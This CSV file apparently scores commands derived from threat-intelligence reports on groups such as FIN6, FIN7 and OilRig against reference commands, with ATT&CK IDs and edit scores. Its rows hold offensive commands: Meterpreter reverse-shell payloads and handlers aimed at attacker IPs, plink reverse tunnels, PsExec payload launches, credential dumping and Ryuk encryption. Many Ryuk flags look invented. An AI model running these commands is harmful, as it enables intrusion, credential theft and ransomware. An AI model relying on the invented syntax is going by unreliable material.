report,file,tool,input_command,matched_command,edit_score,match_found
RESEARCH_OILRIG,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<target_system> -nobanner -accepteula -d -i cmd /c ""<path_to_Client_update.exe>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,281",True
RESEARCH_OILRIG,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<remote_system> cmd /c ""Client update.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,239",True
RPT1_FIN6,command_adfind_TA0007_T1018.txt,adfind,"adfind -sc sl:msds* -b dc=<domain_name>,dc=net -f ""objectcategory=computer""","adfind -f ""(objectcategory=group)""`","0,527",True
RPT1_FIN6,command_plink_TA0011_T1572.txt,plink,plink -sshlog <log_file> -L <listen_ip>:<listen_port>:<remote_host>:<remote_port>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,299",True
SEA_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script .\upx.exe -Out .\evil-upx.png -Image .\kiwi.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,733",True
SEA_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -ssh login.example.com,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,436",True
SEA_APT29,command_pupy_TA0003_T1546.txt,pupy,pupwinutils/psexec.py -s -i cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,248",True
SecurityIntelligence8_FIN6,command_metasploit_TA0002_T1072.txt,metasploit,"msfconsole -x ""use exploit/windows/meterpreter/reverse_tcp; set LHOST 192.168.0.4; set LPORT 3389; set PAYLOAD windows/meterpreter/reverse_tcp; run""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,521",True
SecurityIntelligence8_FIN6,command_metasploit_TA0008_T1072.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f exe -o <file_name>.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,724",True
SecurityIntelligence8_FIN6,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,459",True
SecurityIntelligence8_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_Process Call Create ""powershell.exe -command <powershell_command>""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,43",True
SENTINELONE_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplConnectionFailures,`adfind.exe -f (objectcategory=person) > ad_users.txt`,"0,409",True
SENTINELONE_FIN7,command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|!(name=*Domain Group))"" -a dn","adfind -f ""(objectcategory=group)""`","0,613",True
SENTINELONE_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
SENTINELONE_FIN7,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Cookies.db,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,269",True
SENTINELONE_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,503",True
SENTINELONE_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u <username> -p <password> -d cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,33",True
SENTINELONE_FIN7,command_ryuk_TA0005_T1497.txt,ryuk,ryuk --check-sandbox <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,375",True
SENTINELONE_FIN7,command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --check-sandbox,`ryuk.exe --encrypt --process-name notepad.exe`,"0,507",True
SENTINELONE_FIN7,command_wmic_TA0007_T1082.txt,wmic,wmic os get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,293",True
TALOS_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,507",True
THREATDOWN_OILRIG,command_chrome_passwords_TA0001_T1204.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
THREATDOWN_OILRIG,command_ryuk_TA0011_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
THREATPOST_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
THREATPOST_CARBANAK,command_metasploit_TA0042_T1587.txt,metasploit,set payload windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,588",True
THREATPOST_CARBANAK,command_plink_TA0011_T1219.txt,plink,plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,553",True
THREATPOST_CARBANAK,command_ryuk_TA0002_T1204.txt,ryuk,ryuk.exe -e --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,48",True
THREATPOST_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture,`ryuk.exe --encrypt --process-name notepad.exe`,"0,438",True
TRENDMICRO_WIZARDSPIDER,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
TRENDMICRO_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -e,"```sh
wce.exe -w
```","0,385",True
TRUSTWAVE1_CARBANAK,command_pupy_TA0003_T1053.txt,pupy,"pupysh.py --bg schedule_task --type at --minutes <minutes> --command ""tasklist /V""","[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,212",True
TRUSTWAVE1_CARBANAK,command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe regsvr32 <dll_name>,`rubeus.exe kerberoast /domain:oz.local`,"0,486",True
TRUSTWAVE1_CARBANAK,command_ryuk_TA0003_T1547.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
TRUSTWAVE2_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject-code-into-process=<target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,519",True
TRUSTWAVE3_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
TRUSTWAVE3_CARBANAK,command_rubeus_TA0003_T1543.txt,rubeus,rubeus createnetonly /targetuser:<scheduled_task_user> /show,`rubeus.exe kerberoast /domain:oz.local`,"0,34",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name> --process <target_process>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,569",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe /encrypt_files <file_paths> RYUKTM,`ryuk.exe --encrypt --process-name notepad.exe`,"0,489",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0009_T1022.txt,ryuk,ryuk.exe --encrypt-all <directory_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,558",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0010_T1041.txt,ryuk,ryuk.exe --disconnect-shares,`ryuk.exe --encrypt --process-name notepad.exe`,"0,427",True
UkrainianCriticalInfrastructure_SANDWORM,command_psexec_TA0008_T1021.txt,psexec,psexec.exe -u <user_name> -p <password> -r telnet,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,324",True
UkrainianCriticalInfrastructure_SANDWORM,command_ryuk_TA0040_T1529.txt,ryuk,ryuk.exe /shutdown,`ryuk.exe --encrypt --process-name notepad.exe`,"0,369",True
UNIT42_1_OILRIG,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> -hostkey <host_key_id> <attacker_ssh_user>@<remote_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,5",True
UNIT42_1_OILRIG,command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe --web-shell <web_shell_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,452",True
UNIT42_1_OILRIG,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","0,462",True
VISA_FIN6,command_adfind_TA0007_T1087.txt,adfind,"adfind -f ""(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`","0,861",True
VISA_FIN6,command_metasploit_TA0003_T1505.txt,metasploit,msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; run',"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","0,575",True
VISA_FIN6,command_metasploit_TA0004_T1068.txt,metasploit,msfconsole,`sudo msfconsole`,"0,741",True
VISA_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > shell,`meterpreter > load powershell`,"0,76",True
VISA_FIN6,command_psexec_TA0002_T1106.txt,psexec,"psexec \\remote_system -u domain\username -p password osql.exe -S <SQL_Server_Instance> -Q ""SELECT * FROM database.table""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,326",True
VISA_FIN6,command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -w,"```sh
wce.exe -w
```","0,333",True
